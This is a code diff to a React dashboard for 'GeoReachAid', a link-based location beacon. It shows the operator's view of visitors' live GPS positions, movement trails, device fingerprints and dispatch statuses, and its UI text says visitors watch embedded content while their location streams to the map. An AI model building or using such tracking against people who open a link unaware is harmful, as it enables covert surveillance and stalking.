@@ -4,22 +4,21 @@ import { LocationMap } from "@/components/LocationMap";
 import { toast } from "sonner";
 import {
   Radar, Link2, Copy, Trash2, MapPin, Download, Zap, ExternalLink,
-  MousePointerClick, Globe, Send, CheckCircle2, Clock, XCircle,
-  Smartphone, Tablet, Monitor,
+  MousePointerClick, Globe, Smartphone, Tablet, Monitor, Wifi, Route,
 } from "lucide-react";
+
+const STATUS_COLORS = {
+  pending: "#F59E0B",
+  dispatched: "#06B6D4",
+  delivered: "#10B981",
+  unreachable: "#EF4444",
+};
 
 const DeviceIcon = ({ type }) => {
   const props = { size: 15, className: "shrink-0 text-[#06B6D4]" };
   if (type === "mobile") return <Smartphone {...props} />;
   if (type === "tablet") return <Tablet {...props} />;
   return <Monitor {...props} />;
-};
-
-const STATUS_STYLES = {
-  pending: { color: "#F59E0B", icon: Clock, label: "Pending" },
-  dispatched: { color: "#06B6D4", icon: Send, label: "Dispatched" },
-  delivered: { color: "#10B981", icon: CheckCircle2, label: "Delivered" },
-  unreachable: { color: "#EF4444", icon: XCircle, label: "Unreachable" },
 };
 
 const StatCard = ({ icon: Icon, label, value, accent }) => (
@@ -36,7 +35,7 @@ const StatCard = ({ icon: Icon, label, value, accent }) => (
 
 export default function Dashboard() {
   const [links, setLinks] = useState([]);
-  const [records, setRecords] = useState([]);
+  const [sessions, setSessions] = useState([]);
   const [url, setUrl] = useState("");
   const [title, setTitle] = useState("");
   const [loading, setLoading] = useState(false);
@@ -45,9 +44,9 @@ export default function Dashboard() {
 
   const load = async () => {
     try {
-      const [l, r] = await Promise.all([api.get("/links"), api.get("/records")]);
+      const [l, s] = await Promise.all([api.get("/links"), api.get("/sessions")]);
       setLinks(l.data);
-      setRecords(r.data);
+      setSessions(s.data);
     } catch (e) {
       console.error(e);
     }
@@ -55,7 +54,7 @@ export default function Dashboard() {
 
   useEffect(() => {
     load();
-    const t = setInterval(load, 8000);
+    const t = setInterval(load, 3000);
     return () => clearInterval(t);
   }, []);
 
@@ -91,12 +90,12 @@ export default function Dashboard() {
     const lat = 40.7128 + (Math.random() - 0.5) * 80;
     const lng = -74.006 + (Math.random() - 0.5) * 160;
     await api.post("/simulate", { short_code: code, lat, lng, accuracy: 20 });
-    toast.success("Simulated visitor location captured");
+    toast.success("Simulated live visitor (click again to move them)");
     load();
   };
 
-  const updateStatus = async (id, status) => {
-    await api.patch(`/records/${id}`, { dispatch_status: status });
+  const updateStatus = async (sessionId, status) => {
+    await api.patch(`/sessions/${sessionId}`, { dispatch_status: status });
     load();
   };
 
@@ -105,11 +104,10 @@ export default function Dashboard() {
   };
 
   const totalClicks = links.reduce((s, l) => s + (l.click_count || 0), 0);
-  const gpsCount = records.filter((r) => r.method === "gps").length;
+  const activeCount = sessions.filter((s) => s.active).length;
 
   return (
     <div className="min-h-screen bg-[#0A0D14]">
-      {/* Header */}
       <header className="border-b border-[#26334D] bg-[#0A0D14]/90 backdrop-blur sticky top-0 z-[500]">
         <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 flex items-center justify-between">
           <div className="flex items-center gap-3">
@@ -118,26 +116,32 @@ export default function Dashboard() {
             </div>
             <div>
               <h1 className="font-head text-xl font-extrabold tracking-tight">GeoReach<span className="text-[#10B981]">Aid</span></h1>
-              <p className="text-[10px] text-[#94A3B8] font-mono uppercase tracking-widest">Link Location Beacon</p>
+              <p className="text-[10px] text-[#94A3B8] font-mono uppercase tracking-widest">Live Link Location Beacon</p>
             </div>
           </div>
-          <button
-            onClick={exportCsv}
-            data-testid="export-logs-button"
-            className="flex items-center gap-2 text-sm bg-[#182030] hover:bg-[#1f2a3d] border border-[#26334D] px-4 py-2 rounded-lg transition-colors"
-          >
-            <Download size={16} /> Export CSV
-          </button>
+          <div className="flex items-center gap-3">
+            {activeCount > 0 && (
+              <span className="flex items-center gap-1.5 text-xs font-mono bg-[#10B981]/15 text-[#10B981] px-3 py-1.5 rounded-full" data-testid="active-now-badge">
+                <span className="w-2 h-2 rounded-full bg-[#10B981] animate-pulse" /> {activeCount} live now
+              </span>
+            )}
+            <button
+              onClick={exportCsv}
+              data-testid="export-logs-button"
+              className="flex items-center gap-2 text-sm bg-[#182030] hover:bg-[#1f2a3d] border border-[#26334D] px-4 py-2 rounded-lg transition-colors"
+            >
+              <Download size={16} /> Export
+            </button>
+          </div>
         </div>
       </header>
 
       <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8">
-        {/* Stats */}
         <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-6">
-          <StatCard icon={Link2} label="Active Links" value={links.length} accent="#10B981" />
-          <StatCard icon={MousePointerClick} label="Total Clicks" value={totalClicks} accent="#F59E0B" />
-          <StatCard icon={MapPin} label="Locations" value={records.length} accent="#06B6D4" />
-          <StatCard icon={Globe} label="GPS Pins" value={gpsCount} accent="#10B981" />
+          <StatCard icon={Wifi} label="Live Now" value={activeCount} accent="#10B981" />
+          <StatCard icon={Globe} label="Sessions" value={sessions.length} accent="#06B6D4" />
+          <StatCard icon={Link2} label="Links" value={links.length} accent="#F59E0B" />
+          <StatCard icon={MousePointerClick} label="Total Opens" value={totalClicks} accent="#10B981" />
         </div>
 
         {/* Create link */}
@@ -145,7 +149,7 @@ export default function Dashboard() {
           <h2 className="font-head text-lg font-bold mb-1 flex items-center gap-2">
             <Zap size={18} className="text-[#F59E0B]" /> Generate Tracking Beacon
           </h2>
-          <p className="text-sm text-[#94A3B8] mb-5">Paste any URL (YouTube or other). Visitors are located, then instantly redirected.</p>
+          <p className="text-sm text-[#94A3B8] mb-5">Paste any URL. Visitors watch the content embedded here while their live location streams to your map.</p>
           <form onSubmit={createLink} className="grid md:grid-cols-[1fr_240px_auto] gap-3">
             <input
               value={url}
@@ -193,11 +197,11 @@ export default function Dashboard() {
                     </a>
                   </div>
                   <div className="flex items-center gap-2">
-                    <span className="font-mono text-xs bg-[#182030] px-3 py-1.5 rounded-lg text-[#F59E0B]">{l.click_count} clicks</span>
+                    <span className="font-mono text-xs bg-[#182030] px-3 py-1.5 rounded-lg text-[#F59E0B]">{l.click_count} opens</span>
                     <button onClick={() => copyLink(l.short_code)} title="Copy link" data-testid={`copy-${l.short_code}`} className="p-2 bg-[#182030] hover:bg-[#1f2a3d] rounded-lg transition-colors">
                       <Copy size={16} />
                     </button>
-                    <button onClick={() => simulate(l.short_code)} title="Simulate a visitor" data-testid={`simulate-${l.short_code}`} className="p-2 bg-[#182030] hover:bg-[#1f2a3d] rounded-lg transition-colors text-[#06B6D4]">
+                    <button onClick={() => simulate(l.short_code)} title="Simulate live visitor" data-testid={`simulate-${l.short_code}`} className="p-2 bg-[#182030] hover:bg-[#1f2a3d] rounded-lg transition-colors text-[#06B6D4]">
                       <Zap size={16} />
                     </button>
                     <button onClick={() => deleteLink(l.short_code)} title="Delete" data-testid={`delete-${l.short_code}`} className="p-2 bg-[#182030] hover:bg-[#EF4444]/20 rounded-lg transition-colors text-[#EF4444]">
@@ -214,66 +218,74 @@ export default function Dashboard() {
         <section>
           <h2 className="font-head text-lg font-bold mb-4 flex items-center gap-2">
             <MapPin size={18} className="text-[#06B6D4]" /> Live Location Map
+            <span className="text-xs font-normal text-[#94A3B8]">— green pins are active now, with movement trails</span>
           </h2>
-          <LocationMap records={records} />
+          <LocationMap sessions={sessions} />
         </section>
 
-        {/* Records table */}
+        {/* Sessions table */}
         <section>
-          <h2 className="font-head text-lg font-bold mb-4">Location Records</h2>
+          <h2 className="font-head text-lg font-bold mb-4">Visitor Sessions</h2>
           <div className="bg-[#111622] border border-[#26334D] rounded-2xl overflow-hidden" data-testid="visitor-location-table">
             <div className="overflow-x-auto">
               <table className="w-full text-sm">
                 <thead>
                   <tr className="border-b border-[#26334D] text-left text-[#94A3B8] font-mono text-xs uppercase tracking-wider">
                     <th className="px-4 py-3">Link</th>
+                    <th className="px-4 py-3">Status</th>
                     <th className="px-4 py-3">Location</th>
                     <th className="px-4 py-3">Device</th>
                     <th className="px-4 py-3">Coordinates</th>
-                    <th className="px-4 py-3">Method</th>
-                    <th className="px-4 py-3">Time</th>
+                    <th className="px-4 py-3">Trail</th>
                     <th className="px-4 py-3">Dispatch</th>
                   </tr>
                 </thead>
                 <tbody>
-                  {records.length === 0 ? (
-                    <tr><td colSpan={7} className="px-4 py-10 text-center text-[#94A3B8]">No location signals captured yet.</td></tr>
+                  {sessions.length === 0 ? (
+                    <tr><td colSpan={7} className="px-4 py-10 text-center text-[#94A3B8]">No visitor sessions yet. Share a beacon link to start tracking.</td></tr>
                   ) : (
-                    records.map((r) => {
-                      const st = STATUS_STYLES[r.dispatch_status] || STATUS_STYLES.pending;
-                      return (
-                        <tr key={r.id} className="border-b border-[#26334D]/60 hover:bg-[#182030]/50 transition-colors" data-testid={`record-row-${r.id}`}>
-                          <td className="px-4 py-3 font-mono text-[#10B981]">/{r.short_code}</td>
-                          <td className="px-4 py-3 max-w-[240px] truncate">{r.place || r.city || "—"}</td>
-                          <td className="px-4 py-3 max-w-[200px]">
-                            <div className="flex items-center gap-1.5">
-                              <DeviceIcon type={r.device_type} />
-                              <div className="min-w-0">
-                                <div className="truncate text-xs">{[r.device_brand, r.device_model].filter(Boolean).join(" ") || (r.device_type ? r.device_type.charAt(0).toUpperCase() + r.device_type.slice(1) : "Unknown")}</div>
-                                <div className="truncate text-[10px] text-[#94A3B8] font-mono">{[r.os, r.browser].filter(Boolean).join(" · ") || "—"}</div>
-                              </div>
+                    sessions.map((s) => (
+                      <tr key={s.session_id} className="border-b border-[#26334D]/60 hover:bg-[#182030]/50 transition-colors" data-testid={`session-row-${s.session_id}`}>
+                        <td className="px-4 py-3 font-mono text-[#10B981]">/{s.short_code}</td>
+                        <td className="px-4 py-3">
+                          {s.active ? (
+                            <span className="flex items-center gap-1.5 text-xs font-mono text-[#10B981]">
+                              <span className="w-2 h-2 rounded-full bg-[#10B981] animate-pulse" /> LIVE
+                            </span>
+                          ) : (
+                            <span className="text-xs font-mono text-[#94A3B8]">{s.seconds_ago < 3600 ? `${s.seconds_ago}s ago` : "offline"}</span>
+                          )}
+                        </td>
+                        <td className="px-4 py-3 max-w-[220px] truncate">{s.place || s.city || "—"}</td>
+                        <td className="px-4 py-3 max-w-[200px]">
+                          <div className="flex items-center gap-1.5">
+                            <DeviceIcon type={s.device_type} />
+                            <div className="min-w-0">
+                              <div className="truncate text-xs">{[s.device_brand, s.device_model].filter(Boolean).join(" ") || (s.device_type ? s.device_type.charAt(0).toUpperCase() + s.device_type.slice(1) : "Unknown")}</div>
+                              <div className="truncate text-[10px] text-[#94A3B8] font-mono">{[s.os, s.browser].filter(Boolean).join(" · ") || "—"}</div>
                             </div>
-                          </td>
-                          <td className="px-4 py-3 font-mono text-xs text-[#94A3B8]">{r.lat != null ? `${r.lat.toFixed(4)}, ${r.lng.toFixed(4)}` : "—"}</td>
-                          <td className="px-4 py-3"><span className="text-xs uppercase font-mono text-[#06B6D4]">{r.method}</span></td>
-                          <td className="px-4 py-3 text-xs text-[#94A3B8] whitespace-nowrap">{new Date(r.timestamp).toLocaleString()}</td>
-                          <td className="px-4 py-3">
-                            <select
-                              value={r.dispatch_status}
-                              onChange={(e) => updateStatus(r.id, e.target.value)}
-                              data-testid={`dispatch-select-${r.id}`}
-                              className="bg-[#0A0D14] border border-[#26334D] rounded-lg px-2 py-1 text-xs focus:outline-none focus:border-[#10B981]"
-                              style={{ color: st.color }}
-                            >
-                              <option value="pending">Pending</option>
-                              <option value="dispatched">Dispatched</option>
-                              <option value="delivered">Delivered</option>
-                              <option value="unreachable">Unreachable</option>
-                            </select>
-                          </td>
-                        </tr>
-                      );
-                    })
+                          </div>
+                        </td>
+                        <td className="px-4 py-3 font-mono text-xs text-[#94A3B8]">{s.lat != null ? `${s.lat.toFixed(4)}, ${s.lng.toFixed(4)}` : "—"}</td>
+                        <td className="px-4 py-3">
+                          <span className="flex items-center gap-1 text-xs font-mono text-[#06B6D4]"><Route size={13} /> {(s.points || []).length}</span>
+                        </td>
+                        <td className="px-4 py-3">
+                          <select
+                            value={s.dispatch_status}
+                            onChange={(e) => updateStatus(s.session_id, e.target.value)}
+                            data-testid={`dispatch-select-${s.session_id}`}
+                            className="bg-[#0A0D14] border border-[#26334D] rounded-lg px-2 py-1 text-xs focus:outline-none focus:border-[#10B981]"
+                            style={{ color: STATUS_COLORS[s.dispatch_status] }}
+                          >
+                            <option value="pending">Pending</option>
+                            <option value="dispatched">Dispatched</option>
+                            <option value="delivered">Delivered</option>
+                            <option value="unreachable">Unreachable</option>
+                          </select>
+                        </td>
+                      </tr>
+                    ))
                   )}
                 </tbody>
               </table>
